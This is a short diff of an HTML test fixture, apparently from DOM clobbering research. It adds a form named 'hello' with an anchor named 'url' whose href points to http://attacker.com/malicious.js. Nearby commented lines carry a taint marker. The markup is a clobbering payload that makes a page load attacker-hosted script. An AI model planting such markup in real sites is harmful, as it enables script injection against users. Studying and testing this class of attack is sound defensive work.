@@ -9,7 +9,10 @@
     <a id="hello" name=url href="https://gaeunbae.github.io/hello.js"></a> -->
     ///////////////////////////
 <!--     <a id="hello" href="clobbered:TAINT_window_hello_1_1"></a> -->
-    <input name="hello.url" value="http://attacker.com/malicious.js">
+    <form name="hello">
+      <a name="url" href="http://attacker.com/malicious.js"></a>
+    </form>
+
 
 
 
